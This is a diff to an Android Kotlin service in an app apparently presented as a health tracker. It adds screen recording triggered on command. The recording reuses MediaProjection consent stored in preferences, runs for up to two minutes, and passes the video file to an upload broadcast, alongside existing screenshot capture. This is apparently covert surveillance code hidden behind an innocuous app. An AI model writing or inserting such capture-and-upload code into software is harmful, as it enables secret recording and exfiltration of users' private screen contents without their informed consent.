@@ -12,6 +12,7 @@ import android.graphics.Point
 import android.hardware.display.DisplayManager
 import android.hardware.display.VirtualDisplay
 import android.media.ImageReader
+import android.media.MediaRecorder
 import android.media.projection.MediaProjection
 import android.media.projection.MediaProjectionManager
 import android.os.Build
@@ -25,6 +26,7 @@ import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.ByteArrayOutputStream
+import java.io.File
 import java.io.IOException
 import java.text.SimpleDateFormat
 import java.util.*
@@ -46,6 +48,17 @@ class ScreenshotCaptureService : Service() {
         // Keys for intent extras
         const val EXTRA_RESULT_CODE = "result_code"
         const val EXTRA_DATA = "data"
+
+        const val ACTION_START_SCREEN_RECORD = "START_SCREEN_RECORD"
+        const val ACTION_STOP_SCREEN_RECORD = "STOP_SCREEN_RECORD"
+        const val EXTRA_RECORD_REASON = "record_reason"
+
+        // Track recording state
+        private var isRecording = false
+        private var recordReason: String? = null
+
+        fun isRecording(): Boolean = isRecording
+        fun getRecordReason(): String? = recordReason
     }
 
     private var mediaProjection: MediaProjection? = null
@@ -56,6 +69,8 @@ class ScreenshotCaptureService : Service() {
     private var screenDensity: Int = 0
     private var screenWidth: Int = 0
     private var screenHeight: Int = 0
+    private var mediaRecorder: MediaRecorder? = null
+    private var recordingFile: File? = null
 
     private val screenshotRunnable = object : Runnable {
         override fun run() {
@@ -75,7 +90,12 @@ class ScreenshotCaptureService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.i(TAG, "=== SCREENSHOT SERVICE STARTED ===")
-        Log.i(TAG, "Command: ${intent?.getStringExtra("command")}")
+
+        if (intent != null) {
+            Log.i(TAG, "Action: ${intent.action}")
+            Log.i(TAG, "Command: ${intent.getStringExtra("command")}")
+            Log.i(TAG, "Extras: ${intent.extras?.keySet()}")
+        }
 
         // Start as foreground service
         startForeground(NOTIFICATION_ID, createNotification())
@@ -85,70 +105,99 @@ class ScreenshotCaptureService : Service() {
         val savedResultCode = prefs.getInt("result_code", -1)
         val savedIntentUri = prefs.getString("media_projection_intent", null)
 
-        intent?.let {
-            val command = it.getStringExtra("command")
+        // Handle screen recording actions
+        when (intent?.action) {
+            ACTION_START_SCREEN_RECORD -> {
+                val reason = intent.getStringExtra(EXTRA_RECORD_REASON) ?: "unknown"
+                Log.i(TAG, "Starting screen recording for reason: $reason")
 
-            when (command) {
-                CMD_START_SCREENSHOT -> {
-                    // Try to get from intent first, then from saved prefs
-                    var resultCode = it.getIntExtra(EXTRA_RESULT_CODE, -1)
-                    var data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                        it.getParcelableExtra(EXTRA_DATA, Intent::class.java)
-                    } else {
-                        @Suppress("DEPRECATION")
-                        it.getParcelableExtra(EXTRA_DATA)
-                    }
-
-                    // If not in intent, use saved data
-                    if (data == null && savedResultCode != -1 && savedIntentUri != null) {
-                        resultCode = savedResultCode
-                        data = Intent.parseUri(savedIntentUri, 0)
-                        Log.i(TAG, "Using saved MediaProjection data")
-                    }
-
-                    if (data != null) {
-                        setupMediaProjection(resultCode, data)
-                        startScreenshotCapture()
-                    } else {
-                        Log.e(TAG, "No media projection data available")
-                    }
+                if (mediaProjection == null && savedResultCode != -1 && savedIntentUri != null) {
+                    val data = Intent.parseUri(savedIntentUri, 0)
+                    setupMediaProjection(savedResultCode, data)
+                    handler.postDelayed({
+                        startScreenRecording(reason)
+                    }, 500)
+                } else if (mediaProjection != null) {
+                    startScreenRecording(reason)
+                } else {
+                    Log.e(TAG, "No MediaProjection available for recording")
                 }
-                CMD_STOP_SCREENSHOT -> {
-                    stopScreenshotCapture()
-                }
-                CMD_CAPTURE_NOW -> {
-                    Log.i(TAG, "CAPTURE_NOW - savedResultCode: $savedResultCode")
-                    Log.i(TAG, "CAPTURE_NOW - savedIntentUri: $savedIntentUri")
-                    Log.i(TAG, "CAPTURE_NOW - mediaProjection is null? ${mediaProjection == null}")
+                return START_STICKY
+            }
+            ACTION_STOP_SCREEN_RECORD -> {
+                Log.i(TAG, "Stopping screen recording")
+                stopScreenRecording()
+                return START_STICKY
+            }
+        }
 
-                    // If we have an existing mediaProjection, use it
-                    if (mediaProjection != null) {
-                        Log.i(TAG, "Using existing MediaProjection for capture")
-                        setupVirtualDisplay()
+        // Handle screenshot commands (via "command" extra)
+        val command = intent?.getStringExtra("command")
+        when (command) {
+            CMD_START_SCREENSHOT -> {
+                Log.i(TAG, "Processing START_SCREENSHOT command")
+
+                // Try to get from intent first, then from saved prefs
+                var resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, -1)
+                var data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                    intent.getParcelableExtra(EXTRA_DATA, Intent::class.java)
+                } else {
+                    @Suppress("DEPRECATION")
+                    intent.getParcelableExtra(EXTRA_DATA)
+                }
+
+                // If not in intent, use saved data
+                if (data == null && savedResultCode != -1 && savedIntentUri != null) {
+                    resultCode = savedResultCode
+                    data = Intent.parseUri(savedIntentUri, 0)
+                    Log.i(TAG, "Using saved MediaProjection data")
+                }
+
+                if (data != null) {
+                    setupMediaProjection(resultCode, data)
+                    startScreenshotCapture()
+                } else {
+                    Log.e(TAG, "No media projection data available for screenshot")
+                }
+            }
+            CMD_STOP_SCREENSHOT -> {
+                Log.i(TAG, "Processing STOP_SCREENSHOT command")
+                stopScreenshotCapture()
+            }
+            CMD_CAPTURE_NOW -> {
+                Log.i(TAG, "Processing CAPTURE_NOW command")
+
+                if (mediaProjection != null) {
+                    Log.i(TAG, "Using existing MediaProjection for capture")
+                    setupVirtualDisplay()
+                    handler.postDelayed({
+                        captureSingleScreenshot()
                         handler.postDelayed({
-                            captureSingleScreenshot()  // Use new method
-                            handler.postDelayed({
-                                cleanupVirtualDisplay()
-                            }, 1000)
-                        }, 500)
-                    }
-                    // Otherwise try to use saved data
-                    else if (savedResultCode != -1 && savedIntentUri != null) {
-                        val data = Intent.parseUri(savedIntentUri, 0)
-                        setupMediaProjection(savedResultCode, data)
-                        setupVirtualDisplay()
+                            cleanupVirtualDisplay()
+                        }, 1000)
+                    }, 500)
+                }
+                else if (savedResultCode != -1 && savedIntentUri != null) {
+                    val data = Intent.parseUri(savedIntentUri, 0)
+                    setupMediaProjection(savedResultCode, data)
+                    setupVirtualDisplay()
+                    handler.postDelayed({
+                        captureSingleScreenshot()
                         handler.postDelayed({
-                            captureSingleScreenshot()  // Use new method
-                            handler.postDelayed({
-                                cleanupVirtualDisplay()
-                            }, 1000)
-                        }, 500)
-                    } else {
-                        Log.e(TAG, "No MediaProjection available for single capture")
-                    }
+                            cleanupVirtualDisplay()
+                        }, 1000)
+                    }, 500)
+                } else {
+                    Log.e(TAG, "No MediaProjection available for single capture")
+                }
+            }
+            null -> {
+                if (intent?.action == null) {
+                    Log.w(TAG, "No action or command received")
                 }
             }
         }
+
         return START_STICKY
     }
 
@@ -397,5 +446,170 @@ class ScreenshotCaptureService : Service() {
             Log.e(TAG, "Error getting device ID: ${e.message}")
             "unknown"
         }
+    }
+
+    private fun startScreenRecording(reason: String) {
+        if (isRecording()) {
+            Log.d(TAG, "Already recording for: ${getRecordReason()}")
+            return
+        }
+
+        // Check if MediaProjection is available
+        if (mediaProjection == null) {
+            Log.e(TAG, "MediaProjection is null, cannot start recording")
+            return
+        }
+
+        try {
+            // Setup recording file
+            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
+            val filename = "REC_${reason}_${timestamp}.mp4"
+            val recordsDir = File(filesDir, "screen_recordings")
+            if (!recordsDir.exists()) recordsDir.mkdirs()
+            recordingFile = File(recordsDir, filename)
+            Log.i(TAG, "Recording file: ${recordingFile?.absolutePath}")
+
+            // Create MediaRecorder
+            mediaRecorder = MediaRecorder()
+
+            // Configure with safer settings
+            mediaRecorder?.apply {
+                try {
+                    setVideoSource(MediaRecorder.VideoSource.SURFACE)
+                    Log.i(TAG, "Video source set")
+
+                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                    Log.i(TAG, "Output format set")
+
+                    setOutputFile(recordingFile?.absolutePath)
+                    Log.i(TAG, "Output file set")
+
+                    setVideoEncoder(MediaRecorder.VideoEncoder.H264)
+                    Log.i(TAG, "Video encoder set")
+
+                    // Try with lower resolution first
+                    val recordWidth = 720
+                    val recordHeight = 1280
+                    setVideoSize(recordWidth, recordHeight)
+                    Log.i(TAG, "Video size set to ${recordWidth}x${recordHeight}")
+
+                    setVideoFrameRate(24)
+                    Log.i(TAG, "Frame rate set")
+
+                    setVideoEncodingBitRate(3000000) // 3 Mbps
+                    Log.i(TAG, "Bit rate set")
+
+                    // Prepare
+                    Log.i(TAG, "Calling prepare()...")
+                    prepare()
+                    Log.i(TAG, "MediaRecorder prepared successfully")
+
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error configuring MediaRecorder: ${e.message}")
+                    e.printStackTrace()
+                    cleanupRecording()
+                    return
+                }
+            }
+
+            // Get surface AFTER prepare
+            val surface = mediaRecorder?.surface
+            if (surface == null) {
+                Log.e(TAG, "Failed to get surface from MediaRecorder")
+                cleanupRecording()
+                return
+            }
+            Log.i(TAG, "Got surface from MediaRecorder")
+
+            // Create virtual display with the surface
+            virtualDisplay = mediaProjection?.createVirtualDisplay(
+                "ScreenRecord",
+                screenWidth, screenHeight, screenDensity,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                surface, null, null
+            )
+
+            if (virtualDisplay == null) {
+                Log.e(TAG, "Failed to create virtual display")
+                cleanupRecording()
+                return
+            }
+            Log.i(TAG, "Virtual display created successfully")
+
+            // Start recording
+            try {
+                mediaRecorder?.start()
+                Log.i(TAG, "MediaRecorder started successfully")
+            } catch (e: Exception) {
+                Log.e(TAG, "MediaRecorder start failed: ${e.message}")
+                cleanupRecording()
+                return
+            }
+
+            // Update state
+            isRecording = true
+            recordReason = reason
+            Log.i(TAG, "Screen recording started: $filename for reason: $reason")
+
+            // Auto-stop after 2 minutes
+            handler.postDelayed({
+                stopScreenRecording()
+            }, 120000)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "Error starting screen recording: ${e.message}")
+            e.printStackTrace()
+            cleanupRecording()
+        }
+    }
+
+    private fun stopScreenRecording() {
+        if (!isRecording()) return  // Use companion object method
+
+        Log.i(TAG, "Stopping screen recording for reason: ${getRecordReason()}")  // Use companion object method
+
+        try {
+            mediaRecorder?.apply {
+                try {
+                    stop()
+                    Log.i(TAG, "MediaRecorder stopped successfully")
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error stopping recorder: ${e.message}")
+                }
+                release()
+            }
+
+            virtualDisplay?.release()
+
+            recordingFile?.let { file ->
+                if (file.exists() && file.length() > 0) {
+                    Log.i(TAG, "Recording saved: ${file.absolutePath} (${file.length()} bytes)")
+                    triggerUpload("screen_recording", file.absolutePath)
+                } else {
+                    Log.w(TAG, "Recording file missing or empty")
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error stopping recording: ${e.message}")
+        }
+
+        cleanupRecording()
+    }
+
+    private fun cleanupRecording() {
+        mediaRecorder = null
+        virtualDisplay = null
+        isRecording = false  // This updates companion object's isRecording
+        recordReason = null   // This updates companion object's recordReason
+    }
+
+    private fun triggerUpload(type: String, filePath: String) {
+        val intent = Intent("com.inf2007.healthtracker.UPLOAD_FILE").apply {
+            putExtra("type", type)
+            putExtra("file_path", filePath)
+            setPackage("com.inf2007.healthtracker")
+        }
+        sendBroadcast(intent)
+        Log.i(TAG, "Triggered upload for: $filePath")
     }
 }
